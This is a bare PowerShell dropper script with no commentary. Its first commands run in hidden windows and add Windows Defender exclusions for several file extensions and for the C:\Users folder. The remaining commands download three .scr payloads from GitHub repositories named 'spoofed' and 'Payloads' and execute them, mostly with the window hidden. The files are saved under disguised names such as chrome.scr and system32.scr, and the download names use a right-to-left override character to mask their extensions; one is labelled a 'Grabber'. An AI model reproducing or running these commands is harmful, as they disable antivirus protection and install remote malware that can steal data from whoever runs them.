powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".src"
powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".avi"
powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".ps1"
powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".lnk"
powershell -Windowstyle Hidden Add-MpPreference -ExclusionPath "C:\Users"


powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/spoofed/raw/main/C-Grabber%E2%80%AEiva.scr -o C:\Users\Public\chrome.scr
powershell.exe -w Hidden C:\Users\Public\chrome.scr

powershell -ep bypass iwr -uri  https://github.com/rude90/Payloads/raw/main/X%E2%80%AEiva.scr -o C:\Users\Public\jre.scr
powershell.exe C:\Users\Public\jre.scr

powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/spoofed/raw/main/board%E2%80%AEiva.scr -o C:\Users\Public\system32.scr
powershell.exe -w Hidden C:\Users\Public\system32.scr
